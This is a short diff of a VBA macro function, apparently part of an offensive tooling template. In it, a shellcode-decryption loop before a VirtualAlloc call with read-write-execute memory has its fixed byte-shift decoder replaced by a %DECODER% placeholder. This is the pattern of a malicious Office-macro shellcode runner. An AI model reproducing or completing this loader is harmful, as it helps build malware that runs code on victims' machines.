@@ -31,7 +31,7 @@ Function mymacro()
 	
 	'decryption routine'
 	For i = 0 To UBound(buf) 
-		buf(i) = buf(i) - 2 
+		%DECODER%
 	Next i
 	
 	addr = VirtualAlloc(0, UBound(buf), &H3000, &H40) 
